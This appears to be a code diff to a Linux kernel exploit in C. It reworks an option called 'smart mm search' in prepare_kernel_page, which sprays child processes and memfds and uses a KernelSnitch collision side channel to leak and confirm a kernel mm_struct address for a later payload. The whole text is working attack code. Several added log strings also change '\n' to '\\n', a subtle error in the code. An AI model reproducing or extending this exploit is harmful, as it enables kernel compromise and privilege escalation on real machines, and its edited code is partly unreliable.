@@ -2241,7 +2241,32 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 #endif
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
-#if !defined(APP_SMART_MM_SEARCH) || !APP_SMART_MM_SEARCH
+#if defined(APP_SMART_MM_SEARCH) && APP_SMART_MM_SEARCH
+  /*
+   * Preserve the original S721B allocation geometry. The KernelSnitch state
+   * and leak child must exist before the pre/post/spray children are released.
+   * Smart-mm is an exact-slab confirmation pass on top of that working search.
+   */
+  ks = kernelsnitch_setup(
+      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
+      KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(APP_KERNEL_PAGE_KSNITCH_IDENTITY_END) && \
+    defined(APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION)
+  size_t search_min_object_index = APP_FOPS_MIN_OBJECT_INDEX;
+  size_t search_max_object_index = mm_objs_per_slab - 1;
+  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
+    search_min_object_index = APP_SLIDE_MIN_OBJECT_INDEX;
+    search_max_object_index = APP_SLIDE_MAX_OBJECT_INDEX;
+  }
+  kernelsnitch_set_search_bounds(
+      ks, KERNELSNITCH_IDENTITY_START,
+      APP_KERNEL_PAGE_KSNITCH_IDENTITY_END,
+      search_min_object_index, search_max_object_index,
+      APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION);
+#endif
+  configure_kernelsnitch_profile(ks, payload_mode);
+#else
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   ks = kernelsnitch_setup(
       MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
@@ -2280,9 +2305,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     pre_ctx.childs[i] = clone_child();
   }
-#if !defined(APP_SMART_MM_SEARCH) || !APP_SMART_MM_SEARCH
   child_leak = clone_leak_child();
-#endif
   for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
     post_ctx.childs[i] = clone_child();
   }
@@ -2290,9 +2313,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
   }
-#if !defined(APP_SMART_MM_SEARCH) || !APP_SMART_MM_SEARCH
   memfd_leak = open_memfd(child_leak);
-#endif
   for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
     post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
   }
@@ -2312,121 +2333,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     kill_child(spray_ctx.childs[i]);
     spray_ctx.childs[i] = -1;
   }
-#if defined(APP_SMART_MM_SEARCH) && APP_SMART_MM_SEARCH
-  uintptr_t leaked = (uintptr_t)-1;
-  int smart_found = 0;
-  int final_hint_hit = 0;
-  int first_fd = -1;
-
-  for (size_t attempt = 0;
-       attempt < APP_SMART_MM_SEARCH_ATTEMPTS && !smart_found;
-       ++attempt) {
-    uintptr_t first_mm = (uintptr_t)-1;
-    int first_hint_hit = 0;
-    first_fd = smart_mm_leak_once(
-        (size_t)cpu_count, 0, &first_mm, &first_hint_hit);
-    if (first_fd < 0) {
-      continue;
-    }
-
-    uintptr_t first_canonical = smart_mm_canonicalize(first_mm);
-    if (!smart_mm_object_allowed(first_canonical, payload_mode)) {
-      pr_info("smart mm rejected attempt=%zu mm=%016zx object=%zu\n",
-              attempt + 1, first_canonical,
-              (first_canonical -
-               (first_canonical & ~(ORDER3_SIZE - 1))) / MM_STRUCT_SZ);
-      kernelsnitch_cleanup(ks);
-      ks = NULL;
-      close(first_fd);
-      first_fd = -1;
-      continue;
-    }
-
-    struct kernelsnitch_shared_state *first_state = ks;
-    uintptr_t base_hint = first_canonical & ~(ORDER3_SIZE - 1);
-    uintptr_t confirmed_mm = (uintptr_t)-1;
-    int confirmed_hint = 0;
-    int confirm_fd = smart_mm_leak_once(
-        (size_t)cpu_count, base_hint, &confirmed_mm, &confirmed_hint);
-
-    if (confirm_fd >= 0 && confirmed_hint) {
-      uintptr_t confirmed_canonical =
-          smart_mm_canonicalize(confirmed_mm);
-      if (smart_mm_object_allowed(confirmed_canonical, payload_mode)) {
-        struct kernelsnitch_shared_state *confirmed_state = ks;
-        kernelsnitch_cleanup(first_state);
-        close(first_fd);
-        ks = confirmed_state;
-        leaked = confirmed_canonical;
-        final_hint_hit = 1;
-        memfd_leak = confirm_fd;
-        smart_found = 1;
-        pr_info("smart mm hint confirmed attempt=%zu base=%016zx mm=%016zx\n",
-                attempt + 1, base_hint, leaked);
-        break;
-      }
-      kernelsnitch_cleanup(ks);
-      ks = first_state;
-      close(confirm_fd);
-    } else if (confirm_fd >= 0) {
-      kernelsnitch_cleanup(ks);
-      ks = first_state;
-      close(confirm_fd);
-    }
-
-    /*
-     * The full-search result is the fallback when the two-collision hint
-     * pass misses, exactly like the A53 collection logic.
-     */
-    leaked = first_canonical;
-    final_hint_hit = first_hint_hit;
-    memfd_leak = first_fd;
-    smart_found = 1;
-    ks = first_state;
-    pr_info("smart mm full-search accepted attempt=%zu mm=%016zx base=%016zx hint=%d\n",
-            attempt + 1, leaked, base_hint, final_hint_hit);
-  }
-
-  if (!smart_found || leaked == (uintptr_t)-1 || memfd_leak < 0) {
-    pr_warning("smart mm_struct search failed attempts=%d\n",
-               APP_SMART_MM_SEARCH_ATTEMPTS);
-    if (ks) {
-      kernelsnitch_cleanup(ks);
-      ks = NULL;
-    }
-    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-      kill_child(prepare_ctx.childs[i]);
-    }
-    cleanup_page_prepare_state();
-    return 0;
-  }
-
-  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
-    if (post_ctx.childs[i] > 0) {
-      kill_child(post_ctx.childs[i]);
-      post_ctx.childs[i] = -1;
-    }
-  }
-  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
-    if (pre_ctx.childs[i] > 0) {
-      kill_child(pre_ctx.childs[i]);
-      pre_ctx.childs[i] = -1;
-    }
-  }
-  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
-    if (spray_ctx.childs[i] > 0) {
-      kill_child(spray_ctx.childs[i]);
-      spray_ctx.childs[i] = -1;
-    }
-  }
-
-#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
-  touch_mm_slabinfo();
-#endif
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
-  log_mm_slabinfo("after-child-exit");
-#endif
-#else
   SYSCHK(waitpid(child_leak, NULL, 0));
 #if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
   touch_mm_slabinfo();
@@ -2435,8 +2341,68 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   log_mm_slabinfo("after-child-exit");
 #endif
 
+#if defined(APP_SMART_MM_SEARCH) && APP_SMART_MM_SEARCH
+  uintptr_t leaked = (uintptr_t)-1;
   if (!kernelsnitch_found_collisions(ks)) {
-    pr_warning("KernelSnitch collision finding failed\n");
+    pr_warning("Smart-mm collision finding failed\\n");
+    cleanup_failed_kernel_page("collision");
+    return 0;
+  }
+
+  kernelsnitch_bruteforce(ks);
+  uintptr_t first_mm = ks->mm_struct;
+  if (first_mm == (uintptr_t)-1) {
+    pr_warning("Smart-mm full search found no mm_struct\\n");
+    cleanup_failed_kernel_page("mm-leak");
+    return 0;
+  }
+
+  uintptr_t first_canonical = smart_mm_canonicalize(first_mm);
+  if (!smart_mm_object_allowed(first_canonical, payload_mode)) {
+    pr_warning("Smart-mm full candidate rejected mm=%016zx\\n",
+               first_canonical);
+    cleanup_failed_kernel_page("mm-leak");
+    return 0;
+  }
+
+  struct kernelsnitch_shared_state *first_state = ks;
+  uintptr_t base_hint = first_canonical & ~(ORDER3_SIZE - 1);
+  uintptr_t confirmed_mm = (uintptr_t)-1;
+  int confirmed_hint = 0;
+  int confirm_fd = smart_mm_leak_once(
+      (size_t)cpu_count, base_hint, &confirmed_mm, &confirmed_hint);
+
+  if (confirm_fd >= 0 && confirmed_hint) {
+    uintptr_t confirmed_canonical = smart_mm_canonicalize(confirmed_mm);
+    if (smart_mm_object_allowed(confirmed_canonical, payload_mode)) {
+      struct kernelsnitch_shared_state *confirmed_state = ks;
+      close(memfd_leak);
+      kernelsnitch_cleanup(first_state);
+      ks = confirmed_state;
+      memfd_leak = confirm_fd;
+      leaked = confirmed_canonical;
+      pr_info("smart mm hint confirmed base=%016zx mm=%016zx\\n",
+              base_hint, leaked);
+    } else {
+      kernelsnitch_cleanup(ks);
+      ks = first_state;
+      close(confirm_fd);
+      leaked = first_canonical;
+      pr_info("smart mm hint candidate rejected; retaining full-search mm=%016zx\\n",
+              leaked);
+    }
+  } else {
+    if (confirm_fd >= 0) {
+      close(confirm_fd);
+    }
+    ks = first_state;
+    leaked = first_canonical;
+    pr_info("smart mm hint miss; retaining full-search mm=%016zx base=%016zx\\n",
+            leaked, base_hint);
+  }
+#else
+  if (!kernelsnitch_found_collisions(ks)) {
+    pr_warning("KernelSnitch collision finding failed\\n");
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
     cleanup_failed_kernel_page("collision");
 #else
@@ -2453,7 +2419,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   kernelsnitch_bruteforce(ks);
   uintptr_t leaked = ks->mm_struct;
   if (leaked == (uintptr_t)-1) {
-    pr_warning("KernelSnitch mm_struct leak failed\n");
+    pr_warning("KernelSnitch mm_struct leak failed\\n");
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
     cleanup_failed_kernel_page("mm-leak");
 #else
@@ -2466,6 +2432,10 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 #endif
     return 0;
   }
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+  leaked = canonicalize_kernelsnitch_pointer(leaked);
+  log_mm_slabinfo("after-leak");
+#endif
 #endif /* !APP_SMART_MM_SEARCH */
 
 #if defined(APP_SMART_MM_SEARCH) && APP_SMART_MM_SEARCH
